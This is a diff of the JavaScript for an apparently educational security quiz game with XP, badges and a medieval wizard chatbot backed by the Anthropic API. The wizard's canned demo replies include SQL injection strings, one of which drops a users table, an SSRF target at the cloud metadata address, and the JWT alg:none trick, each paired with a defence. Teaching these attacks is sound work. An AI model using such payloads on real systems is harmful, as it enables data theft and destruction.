+    addWizMsg('wiz','⚠️ Not quite. Correct answer: <strong>'+escHtml(shuffledOpts[shuffledCorrect].text)+'</strong>. Ask me to explain!');
   }
 }
 
-function onNext() {
+function onNext(){
   document.getElementById('qpanel').classList.remove('open');
-  charAction = 'idle';
-  setTimeout(function() {
-    walkToNextStone();
-  }, 500);
+  charAction='idle';
+  setTimeout(walkToNextStone, 450);
 }
 
-// ═══════════════════════════════════════════════════════
-// RANK & PROGRESS
-// ═══════════════════════════════════════════════════════
-function checkRankUp(prevXP) {
-  RANK_ORDER.forEach(function(rank, i) {
-    if (i === 0) return;
-    if (prevXP < XP_THRESH[rank] && state.xp >= XP_THRESH[rank]) {
-      state.rank = rank;
-      var prevRank = RANK_ORDER[i - 1];
-      if (!state.badges.includes(prevRank)) {
-        state.badges.push(prevRank);
-        showBadge(prevRank);
-      }
+function showVictory(){
+  var ov=document.createElement('div');
+  ov.className='overlay';
+  ov.innerHTML='<div class="mcard" style="text-align:center"><h2>Quest Complete! 👑</h2>'+
+    '<p style="font-size:2.8rem;margin:14px 0">🏆</p>'+
+    '<p>You are a true <strong style="color:#E8A820">Security Knight</strong>!<br>Total XP: <strong style="color:#FFD700">'+state.xp+'</strong></p>'+
+    '<div style="display:flex;gap:8px;margin-top:18px"><button class="bgold" onclick="this.closest(\'.overlay\').remove()">Keep Exploring</button>'+
+    '<button class="bghost" onclick="resetGame()">↺ Play Again</button></div></div>';
+  document.body.appendChild(ov);
+}
+
+// ═══════════════════════════════════════════════
+// RANK & BADGES
+// ═══════════════════════════════════════════════
+function checkRankUp(prevXP){
+  // Paige badge: first correct answer
+  if(!state.badges.includes('paige') && state.completed.length>=1){
+    state.badges.push('paige'); showBadge('paige'); return;
+  }
+  // Squire badge: reach 200 XP
+  if(!state.badges.includes('squire') && prevXP<200 && state.xp>=200){
+    state.badges.push('squire'); showBadge('squire'); return;
+  }
+  // Rank changes
+  RANK_ORDER.forEach(function(rank,i){
+    if(i===0) return;
+    if(prevXP < XP_THRESH[rank] && state.xp >= XP_THRESH[rank]){
+      state.rank=rank;
     }
   });
-  if (!state.badges.includes('paige') && state.completed.length >= 1) {
-    state.badges.push('paige');
-    showBadge('paige');
-  }
-  if (state.completed.length === CHALLENGES.length && !state.badges.includes('knight')) {
-    state.badges.push('knight');
-    showBadge('knight');
+  // Knight badge: complete all 15
+  if(!state.badges.includes('knight') && state.completed.length>=15){
+    state.badges.push('knight'); showBadge('knight');
   }
 }
 
-function showBadge(rank) {
-  var d = {
-    paige:  {e:'🛡️', t:'Paige Badge Earned!', p:'You completed your first trials!'},
-    squire: {e:'⚔️', t:'Squire Badge Earned!', p:'You have risen to Squire!'},
-    knight: {e:'👑', t:'Knight Badge Earned!', p:'You are a true Security Knight!'}
+function showBadge(rank){
+  var d={
+    paige: {e:'🛡️',t:'Paige Badge!',p:'First challenge conquered! The quest begins.'},
+    squire:{e:'⚔️',t:'Squire Badge!',p:'You have risen to the rank of Squire!'},
+    knight:{e:'👑',t:'Knight Badge!',p:'You are a true Security Knight!'}
   };
-  var bd = d[rank];
-  document.getElementById('bdgEmoji').textContent = bd.e;
-  document.getElementById('bdgTitle').textContent = bd.t;
-  document.getElementById('bdgDesc').textContent  = bd.p;
+  var bd=d[rank];
+  document.getElementById('bdgEmoji').textContent=bd.e;
+  document.getElementById('bdgTitle').textContent=bd.t;
+  document.getElementById('bdgDesc').textContent=bd.p;
   document.getElementById('bdgModal').classList.remove('hidden');
 }
 
-function updateHUD() {
-  var rank = state.rank;
-  var xp = state.xp;
-  var ri = RANK_ORDER.indexOf(rank);
-  var nextT = ri + 1 < RANK_ORDER.length ? XP_THRESH[RANK_ORDER[ri + 1]] : XP_THRESH[rank] + 300;
-  var prevT = XP_THRESH[rank];
-  var pct = Math.min(100, ((xp - prevT) / (nextT - prevT)) * 100);
-  document.getElementById('xpFill').style.width = pct + '%';
-  document.getElementById('xpLbl').textContent = xp + ' / ' + nextT;
-  var rb = document.getElementById('rankBadge');
-  rb.textContent = RANK_ICONS[rank] + ' ' + RANK_LABELS[rank];
-  rb.className = 'rbadge ' + RANK_CSS[rank];
-  RANK_ORDER.forEach(function(r) {
-    var id = r === 'paige' ? 'bp' : r === 'squire' ? 'bs' : 'bk';
-    if (state.badges.includes(r)) document.getElementById(id).classList.add('earned');
+function updateHUD(){
+  var rank=state.rank, xp=state.xp;
+  var ri=RANK_ORDER.indexOf(rank);
+  var nextT=ri+1<RANK_ORDER.length?XP_THRESH[RANK_ORDER[ri+1]]:XP_THRESH[rank]+300;
+  var prevT=XP_THRESH[rank];
+  var pct=Math.min(100,((xp-prevT)/(nextT-prevT))*100);
+  document.getElementById('xpFill').style.width=pct+'%';
+  document.getElementById('xpLbl').textContent=xp+'/'+nextT;
+  var rb=document.getElementById('rankBadge');
+  rb.textContent=RANK_ICONS[rank]+' '+RANK_LABELS[rank];
+  rb.className='rbadge '+RANK_CSS[rank];
+  RANK_ORDER.forEach(function(r){
+    var id=r==='paige'?'bp':r==='squire'?'bs':'bk';
+    var el=document.getElementById(id);
+    if(state.badges.includes(r) && !el.classList.contains('earned')){
+      el.classList.add('earned');
+    }
   });
 }
 
-function saveState() { localStorage.setItem('sk3_state', JSON.stringify(state)); }
+function saveState(){localStorage.setItem('sk4_state',JSON.stringify(state));}
 
-function showCompletionModal() {
-  addWizMsg('wiz', '👑 <strong>QUEST COMPLETE!</strong> You are a true Security Knight! Total XP: ' + state.xp);
-  // Show a simple alert-style completion
-  var overlay = document.createElement('div');
-  overlay.className = 'overlay';
-  overlay.innerHTML = '<div class="mcard" style="text-align:center"><h2>Quest Complete!</h2>' +
-    '<p style="font-size:3rem;margin:16px 0">👑</p>' +
-    '<p>You are a true <strong style="color:#E8A820">Security Knight</strong>!</p>' +
-    '<p style="margin-top:8px">Total XP: ' + state.xp + '</p>' +
-    '<button class="bgold" style="margin-top:18px;width:100%" onclick="resetGame()">Train Again</button></div>';
-  document.body.appendChild(overlay);
-}
-
-function resetGame() {
-  localStorage.removeItem('sk3_state');
+function resetGame(){
+  localStorage.removeItem('sk4_state');
+  sessionStorage.removeItem('sk4_key');
   location.reload();
 }
 
-// ═══════════════════════════════════════════════════════
-// PARTICLE EFFECTS
-// ═══════════════════════════════════════════════════════
-function burst(x, y, col) {
-  for (var i = 0; i < 20; i++) {
-    var p = document.createElement('div');
-    p.className = 'pt';
-    var angle = (Math.PI * 2 / 20) * i;
-    var d = 60 + Math.random() * 80;
-    p.style.cssText = 'left:' + (x - 4) + 'px;top:' + (y - 4) + 'px;' +
-      'width:' + (4 + Math.random() * 6) + 'px;height:' + (4 + Math.random() * 6) + 'px;' +
-      'background:' + (Math.random() > 0.5 ? col : '#FFD700') + ';' +
-      '--tx:' + (Math.cos(angle) * d) + 'px;--ty:' + (Math.sin(angle) * d) + 'px;' +
-      'animation-duration:' + (0.5 + Math.random() * 0.5) + 's;' +
-      'animation-delay:' + (Math.random() * 0.1) + 's;';
-    document.body.appendChild(p);
-    setTimeout(function(el) { el.remove(); }, 1200, p);
+// ═══════════════════════════════════════════════
+// SIDEBAR QUEST LIST
+// ═══════════════════════════════════════════════
+function renderSidebar(){
+  var tiers=[
+    {key:'paige',cnt:'pcnt',list:'pquests',color:'var(--pc)',range:[0,4]},
+    {key:'squire',cnt:'scnt',list:'squests',color:'var(--sc)',range:[5,9]},
+    {key:'knight',cnt:'kcnt',list:'kquests',color:'var(--kc)',range:[10,14]}
+  ];
+  tiers.forEach(function(tier){
+    var chs=CHALLENGES.slice(tier.range[0],tier.range[1]+1);
+    var done=chs.filter(function(c){return state.completed.includes(c.id);}).length;
+    document.getElementById(tier.cnt).textContent=done+'/5';
+    var container=document.getElementById(tier.list);
+    container.innerHTML='';
+    chs.forEach(function(ch,li){
+      var globalIdx=tier.range[0]+li+1;
+      var isDone=state.completed.includes(ch.id);
+      var isCur=stoneIdx===globalIdx;
+      var isLocked=!isDone&&stoneIdx<globalIdx;
+      var div=document.createElement('div');
+      div.className='sb-item'+(isDone?' done':'')+(isCur?' active':'')+(isLocked?' locked':'');
+      div.innerHTML='<div class="sb-name">'+escHtml(ch.title)+'</div>'+
+        '<div class="sb-meta"><span class="sb-xp">+'+ch.xp+' XP</span>'+escHtml(ch.topic||'')+'</div>'+
+        '<span class="sb-check">'+(isDone?'✅':isLocked?'🔒':'⚔️')+'</span>';
+      container.appendChild(div);
+    });
+  });
+}
+
+// ═══════════════════════════════════════════════
+// UI TOGGLES
+// ═══════════════════════════════════════════════
+function toggleSidebar(){
+  sidebarShown=!sidebarShown;
+  document.getElementById('sidebar-left').classList.toggle('collapsed',!sidebarShown);
+  document.getElementById('btnQuests').classList.toggle('active',sidebarShown);
+  resizeCanvas();
+}
+
+function toggleWizard(){
+  wizShown=!wizShown;
+  document.getElementById('wpanel').classList.toggle('collapsed',!wizShown);
+  document.getElementById('btnWiz').classList.toggle('active',wizShown);
+  resizeCanvas();
+}
+
+function toggleMusic(){
+  Music.toggle();
+}
+
+// ═══════════════════════════════════════════════
+// WIZARD & AI
+// ═══════════════════════════════════════════════
+var WIZARD_SYSTEM='You are Merlin, a wise medieval security wizard. Help with OWASP Top 10 and secure coding in a warm, encouraging medieval tone. Under 150 words. Use bullet points for steps. Reference the current challenge if relevant.';
+
+function sendWizard(){
+  var input=document.getElementById('winput');
+  var text=input.value.trim();
+  if(!text||wizBusy) return;
+  input.value='';
+  addWizMsg('user', escHtml(text));
+  callWizard(text);
+}
+
+function askHint(type){
+  if(wizBusy) return;
+  var topic = current ? current.topic : 'secure coding';
+  var prompts={
+    hint: 'Give a hint for "'+topic+'" without revealing the answer.',
+    explain: 'Explain '+topic+' — how does this attack work?',
+    realworld: 'Give a real-world example of a '+topic+' attack.',
+    prevent: 'How do I prevent '+topic+' vulnerabilities? Give code examples.'
+  };
+  var labels={hint:'💡 Hint',explain:'📖 Explain',realworld:'🌍 Real example',prevent:'🛡️ Prevention'};
+  addWizMsg('user', labels[type]);
+  callWizard(prompts[type]);
+}
+
+function callWizard(text){
+  wizBusy=true;
+  var typing=addTyping();
+  if(demoMode||!apiKey){
+    setTimeout(function(){typing.remove();addWizMsg('wiz',getDemoReply(text));wizBusy=false;},800+Math.random()*500);
+    return;
   }
+  var ctx_note = current ? ' (Current topic: '+current.topic+')' : '';
+  fetch('https://api.anthropic.com/v1/messages',{
+    method:'POST',
+    headers:{'Content-Type':'application/json','x-api-key':apiKey,'anthropic-version':'2023-06-01','anthropic-dangerous-direct-browser-access':'true'},
+    body:JSON.stringify({model:'claude-sonnet-4-6',max_tokens:350,system:WIZARD_SYSTEM,messages:[{role:'user',content:text+ctx_note}]})
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    typing.remove();
+    var reply=d.content&&d.content[0]?d.content[0].text:'The crystal ball is cloudy — please try again.';
+    addWizMsg('wiz',mdToHtml(reply));
+    wizBusy=false;
+  })
+  .catch(function(e){
+    typing.remove();
+    addWizMsg('wiz','⚠️ Wizard connection failed: '+e.message+'. Check your API key!');
+    wizBusy=false;
+  });
 }
 
-function escHtml(s) {
-  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function getDemoReply(text){
+  var t=text.toLowerCase();
+  if(t.includes('hint')) return '💡 <strong>A nudge from Merlin:</strong> Think about where <em>user-controlled data</em> flows — does it cross a trust boundary without being validated? That\'s often where sorcery strikes!';
+  if(t.includes('sql')||t.includes('injection')) return '⚔️ <strong>SQL Injection</strong> lets attackers manipulate queries by injecting SQL syntax.<br><br>• Input: <code>\' OR 1=1--</code> returns all rows<br>• Input: <code>\'; DROP TABLE users;--</code> destroys data<br><br>🛡️ Shield: Parameterized queries — data never becomes code.';
+  if(t.includes('xss')||t.includes('cross-site script')) return '🧙 <strong>XSS</strong> lets attackers inject scripts into pages others view.<br><br>• Stored XSS: saved in database, hits every visitor<br>• Reflected XSS: bounced off server in URL<br>• DOM XSS: manipulates the page client-side<br><br>🛡️ Shield: Encode output, use textContent, add CSP header.';
+  if(t.includes('csrf')) return '⚔️ <strong>CSRF</strong> tricks your browser into making requests you never intended.<br><br>• Evil site embeds a hidden form/image<br>• Your browser sends cookies automatically<br><br>🛡️ Shield: CSRF tokens, SameSite=Strict cookies.';
+  if(t.includes('password')||t.includes('hash')) return '🔐 Password hashing guidelines:<br><br>• ✅ bcrypt (cost 12+)<br>• ✅ Argon2id (recommended by OWASP)<br>• ✅ scrypt<br>• ❌ MD5 — cracked in milliseconds<br>• ❌ SHA-256 — too fast for passwords<br>• ❌ Plain text — catastrophic';
+  if(t.includes('jwt')) return '🧙 <strong>JWT attacks:</strong><br><br>• <strong>alg:none</strong> — strips signature verification<br>• Algorithm confusion (RS256 → HS256)<br>• Weak secrets bruteforceable with jwt-cracker<br><br>🛡️ Shield: Pin algorithm server-side, reject "none", rotate secrets.';
+  if(t.includes('csrf')||t.includes('ssrf')) return '🏰 <strong>SSRF</strong> makes the server fetch internal resources on an attacker\'s behalf.<br><br>• Target: http://169.254.169.254 (AWS metadata)<br>• Can expose cloud credentials<br><br>🛡️ Shield: Allowlist URLs, block private IP ranges.';
+  if(t.includes('race')||t.includes('toctou')) return '⚔️ <strong>Race Conditions</strong> occur when two operations both pass a check before either completes.<br><br>🛡️ Shield:<br>• Database row-level locking (SELECT FOR UPDATE)<br>• Optimistic locking with version fields<br>• Atomic operations';
+  if(t.includes('real')||t.includes('example')) return '🌍 <strong>Real-world examples:</strong><br><br>• <strong>Equifax 2017</strong>: Apache Struts CVE exploited (OWASP A06)<br>• <strong>Twitter 2022</strong>: API auth bypass exposed 5.4M accounts (IDOR)<br>• <strong>Log4Shell 2021</strong>: JNDI injection via log messages<br>• <strong>SolarWinds 2020</strong>: Supply chain attack via build system';
+  if(t.includes('prevent')||t.includes('fix')||t.includes('shield')) return '🛡️ <strong>General secure coding principles:</strong><br><br>• Validate and sanitize ALL user inputs<br>• Use parameterized queries (never string concat)<br>• Apply least privilege everywhere<br>• Authenticate AND authorize every request<br>• Keep dependencies updated<br>• Log security events and alert on anomalies';
+  return '🧙 <strong>Merlin speaks!</strong> I can help with any OWASP vulnerability — just ask about SQL Injection, XSS, CSRF, JWT, race conditions, SSRF, file uploads, and more! In demo mode I use pre-written wisdom. Add your Anthropic API key for full real-time guidance.';
 }
 
-// ═══════════════════════════════════════════════════════
-// WIZARD
-// ═══════════════════════════════════════════════════════
-var WIZARD_SYSTEM = 'You are Merlin, a wise medieval security wizard. Help with OWASP Top 10 and secure coding in a warm medieval tone. Under 130 words. Use bullet points. Reference the current challenge if relevant.';
-function getDemoReply(text) {
-  var t = text.toLowerCase();
-  if (t.includes('hint')) return '💡 <strong>A nudge:</strong> Look at how user-supplied data flows into the sensitive operation. Is it treated as <em>data</em> or as <em>instructions</em>? That distinction is often the key to the vulnerability!';
-  if (t.includes('sql')) return '⚔️ <strong>SQL Injection</strong> lets attackers manipulate database queries by injecting SQL syntax into user inputs.<br><br>Shield: Use <strong>parameterized queries</strong> — they separate data from SQL code so input can never change the query structure.';
-  if (t.includes('xss')) return '🧙 <strong>XSS</strong> lets attackers inject scripts into pages viewed by others.<br><br>Three types: <strong>Stored</strong> (in database), <strong>Reflected</strong> (in URL), <strong>DOM-based</strong> (in JS).<br><br>Shield: encode output, use textContent, add a strong Content-Security-Policy.';
-  if (t.includes('csrf')) return '⚔️ <strong>CSRF</strong> tricks authenticated users into making requests they never intended.<br><br>Shield: <strong>CSRF tokens</strong> — a secret random value in every form, validated server-side. Also use SameSite=Strict cookies.';
-  if (t.includes('password') || t.includes('hash')) return '🔐 <strong>Password hashing:</strong> Never plain text, never MD5/SHA-256 (too fast).<br><br>Use: <strong>bcrypt</strong> (cost 12+), <strong>Argon2id</strong> (OWASP recommended), or <strong>scrypt</strong>. These are deliberately slow — making brute-force take years.';
-  if (t.includes('jwt')) return '🧙 <strong>JWT attacks:</strong> The "alg:none" trick fools vulnerable libraries into skipping signature verification.<br><br>Shield: always pin the expected algorithm server-side and explicitly reject "none".';
-  if (t.includes('race') || t.includes('toctou')) return '⚔️ <strong>Race conditions</strong> occur when two operations both pass a check before either completes the action.<br><br>Shield: database transactions with <strong>row-level locking</strong> (SELECT FOR UPDATE) or optimistic locking with version fields.';
-  return '🧙 <strong>Greetings!</strong> In demo mode I can help with: SQL Injection, XSS, CSRF, JWT, race conditions, passwords, file uploads, and OWASP Top 10. Add your Anthropic API key for full wizard wisdom — just refresh and enter it on the welcome screen!';
+function addWizMsg(role,html){
+  var wm=document.getElementById('wmsgs');
+  var d=document.createElement('div');
+  d.className='wm '+role; d.innerHTML=html;
+  wm.appendChild(d); wm.scrollTop=wm.scrollHeight; return d;
 }
-
-function addWizMsg(role, html) {
-  var wmsgs = document.getElementById('wmsgs');
-  var d = document.createElement('div');
-  d.className = 'wm ' + role;
-  d.innerHTML = html;
-  wmsgs.appendChild(d);
-  wmsgs.scrollTop = wmsgs.scrollHeight;
-  return d;
+function addTyping(){
+  var wm=document.getElementById('wmsgs');
+  var d=document.createElement('div');
+  d.className='wm wiz';
+  d.innerHTML='<div class="wtyp"><span></span><span></span><span></span></div>';
+  wm.appendChild(d); wm.scrollTop=wm.scrollHeight; return d;
 }
-
-function addTyping() {
-  var wmsgs = document.getElementById('wmsgs');
-  var d = document.createElement('div');
-  d.className = 'wm wiz';
-  d.innerHTML = '<div class="wtyp"><span></span><span></span><span></span></div>';
-  wmsgs.appendChild(d);
-  wmsgs.scrollTop = wmsgs.scrollHeight;
-  return d;
-}
-
-function mdToHtml(md) {
-  return md
-    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
-    .replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>')
-    .replace(/\*([^*]+)\*/g,'<em>$1</em>')
-    .replace(/`([^`]+)`/g,'<code style="font-family:JetBrains Mono,monospace;font-size:.77rem;background:rgba(255,255,255,.07);padding:1px 4px;border-radius:3px">$1</code>')
-    .replace(/^#{1,3} (.+)$/gm,'<strong style="color:var(--gold)">$1</strong>')
-    .replace(/^[-*] (.+)$/gm,'• $1')
-    .replace(/\n/g,'<br>');
-}
-
-function addWizMsg(role, html) {
-  var wmsgs = document.getElementById('wmsgs');
-  var d = document.createElement('div');
-  d.className = 'wm ' + role;
-  d.innerHTML = html;
-  wmsgs.appendChild(d);
-  wmsgs.scrollTop = wmsgs.scrollHeight;
-  return d;
-}
-function addTyping() {
-  var wmsgs = document.getElementById('wmsgs');
-  var d = document.createElement('div');
-  d.className = 'wm wiz';
-  d.innerHTML = '<div class="wtyp"><span></span><span></span><span></span></div>';
-  wmsgs.appendChild(d);
-  wmsgs.scrollTop = wmsgs.scrollHeight;
-  return d;
-}
-function mdToHtml(md) {
+function mdToHtml(md){
   return md.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
     .replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>')
     .replace(/\*([^*]+)\*/g,'<em>$1</em>')
-    .replace(/`([^`]+)`/g,'<code style="font-family:JetBrains Mono,monospace;font-size:.77rem;background:rgba(255,255,255,.07);padding:1px 4px;border-radius:3px">$1</code>')
+    .replace(/`([^`]+)`/g,'<code style="font-family:JetBrains Mono,monospace;font-size:.75rem;background:rgba(255,255,255,.08);padding:1px 5px;border-radius:3px">$1</code>')
     .replace(/\n/g,'<br>');
 }
 
-// ═══════════════════════════════════════════════════════
-// INIT
-// ═══════════════════════════════════════════════════════
-document.addEventListener('DOMContentLoaded', function() {
-  gc = document.getElementById('gc');
-  ctx = gc.getContext('2d');
+// ═══════════════════════════════════════════════
+// PARTICLES
+// ═══════════════════════════════════════════════
+function burst(x,y,col){
+  for(var i=0;i<18;i++){
+    var p=document.createElement('div');
+    p.className='pt';
+    var a=(Math.PI*2/18)*i, d=60+Math.random()*80;
+    p.style.cssText='left:'+(x-4)+'px;top:'+(y-4)+'px;width:'+(4+Math.random()*6)+'px;height:'+(4+Math.random()*6)+'px;background:'+(Math.random()>.5?col:'#FFD700')+';--tx:'+(Math.cos(a)*d)+'px;--ty:'+(Math.sin(a)*d)+'px;animation-duration:'+(0.5+Math.random()*.5)+'s;animation-delay:'+(Math.random()*.1)+'s;';
+    document.body.appendChild(p);
+    setTimeout(function(el){el.remove();},1100,p);
+  }
+}
 
+function escHtml(s){
+  if(!s) return '';
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ═══════════════════════════════════════════════
+// MODAL & INIT
+// ═══════════════════════════════════════════════
+function showKeyModal(){
+  gameState='MODAL';
+  if(apiKey){
+    startGame();
+  } else {
+    document.getElementById('keyModal').classList.remove('hidden');
+  }
+}
+
+document.addEventListener('DOMContentLoaded',function(){
+  gc=document.getElementById('gc');
+  ctx=gc.getContext('2d');
   resizeCanvas();
-  window.addEventListener('resize', function() { resizeCanvas(); });
+  window.addEventListener('resize',resizeCanvas);
 
-  // Modal buttons
-  document.getElementById('btnSave').addEventListener('click', function() {
-    var k = document.getElementById('modalKey').value.trim();
-    if (!k.startsWith('sk-ant')) {
-      document.getElementById('modalKey').style.borderColor = '#E84040';
-      setTimeout(function() { document.getElementById('modalKey').style.borderColor = ''; }, 1500);
+  document.getElementById('btnSave').addEventListener('click',function(){
+    var k=document.getElementById('modalKey').value.trim();
+    if(!k.startsWith('sk-ant')){
+      document.getElementById('modalKey').style.borderColor='#E84040';
+      setTimeout(function(){document.getElementById('modalKey').style.borderColor='';},1500);
       return;
     }
-    apiKey = k;
-    sessionStorage.setItem('sk3_key', k);
+    apiKey=k; sessionStorage.setItem('sk4_key',k);
+    document.getElementById('keyModal').classList.add('hidden');
     startGame();
   });
-  document.getElementById('btnDemo').addEventListener('click', function() {
-    demoMode = true;
+
+  document.getElementById('btnDemo').addEventListener('click',function(){
+    demoMode=true;
+    document.getElementById('keyModal').classList.add('hidden');
     startGame();
   });
-  document.getElementById('bdgClose').addEventListener('click', function() {
+
+  document.getElementById('bdgClose').addEventListener('click',function(){
     document.getElementById('bdgModal').classList.add('hidden');
     updateHUD();
   });
-  document.getElementById('wizToggle').addEventListener('click', function() {
-    wizShown = !wizShown;
-    var wp = document.getElementById('wpanel');
-    var qp = document.getElementById('qpanel');
-    if (wizShown) {
-      wp.classList.remove('hidden');
-      qp.style.right = '300px';
-    } else {
-      wp.classList.add('hidden');
-      qp.style.right = '0';
-    }
-    resizeCanvas();
-  });
+
   document.getElementById('wsend').addEventListener('click', sendWizard);
-  document.getElementById('winput').addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') sendWizard();
-  });
-  document.querySelectorAll('.hbtn').forEach(function(btn) {
-    btn.addEventListener('click', function() { askHint(btn.getAttribute('data-hint')); });
+  document.getElementById('winput').addEventListener('keydown',function(e){if(e.key==='Enter') sendWizard();});
+
+  document.querySelectorAll('.hbtn').forEach(function(btn){
+    btn.addEventListener('click',function(){askHint(btn.getAttribute('data-hint'));});
   });
 
-  // Build the map
+  // Build map
   buildMap();
 
-  // If already has API key, skip modal
-  if (apiKey) {
-    startGame();
-  }
-  // else modal stays open
+  // Run intro
+  runIntro();
+  requestAnimationFrame(loop);
 });
 
-function startGame() {
-  document.getElementById('keyModal').classList.add('hidden');
-  gameState = 'WALKING';
+function startGame(){
+  gameState='WALKING';
+  Music.start();
 
-  // Restore progress: find where the player left off
-  var lastCompleted = 0;
-  for (var i = 1; i <= 15; i++) {
-    var ch = CHALLENGES[i - 1];
-    if (ch && state.completed.includes(ch.id)) {
-      lastCompleted = i;
-    }
+  // Restore: find last completed stone
+  var lastDone=0;
+  for(var i=1;i<=15;i++){
+    if(CHALLENGES[i-1]&&state.completed.includes(CHALLENGES[i-1].id)) lastDone=i;
   }
 
-  stoneIdx = lastCompleted;
-  charX = WAYPOINTS[stoneIdx].x;
-  charY = WAYPOINTS[stoneIdx].y;
-  camX = Math.max(0, Math.min(MAP_W - vpW, charX - vpW * 0.4));
-  updateHUD();
+  stoneIdx=lastDone;
+  charX=WAYPOINTS[stoneIdx].x; charY=WAYPOINTS[stoneIdx].y;
+  camX=Math.max(0,charX-vpW*.4);
+  updateHUD(); renderSidebar();
 
-  if (lastCompleted === 0) {
-    // Fresh start: walk to stone 1
-    addWizMsg('wiz', '⚔️ <strong>Your quest begins!</strong> Walk to the first stepping stone to begin your training!');
-    setTimeout(function() { walkToNextStone(); }, 1000);
-  } else if (lastCompleted >= 15) {
-    // All done
-    gameState = 'VICTORY';
-    charAction = 'victory';
+  if(lastDone===0){
+    addWizMsg('wiz','⚔️ <strong>Your quest begins!</strong> The knight walks to the first challenge...');
+    setTimeout(walkToNextStone,1200);
+  } else if(lastDone>=15){
+    charAction='victory'; gameState='VICTORY';
+    addWizMsg('wiz','👑 <strong>All 15 challenges complete!</strong> You are a true Security Knight! XP: '+state.xp);
+    setTimeout(showVictory,800);
   } else {
-    // Resume: walk to next uncompleted stone
-    addWizMsg('wiz', '⚔️ <strong>Welcome back!</strong> Resuming your quest at stone ' + (lastCompleted + 1) + '!');
-    setTimeout(function() { walkToNextStone(); }, 800);
+    addWizMsg('wiz','⚔️ <strong>Welcome back!</strong> Resuming at stone '+(lastDone+1)+'...');
+    setTimeout(walkToNextStone,800);
   }
-
-  requestAnimationFrame(loop);
 }
 </script>
 </body>
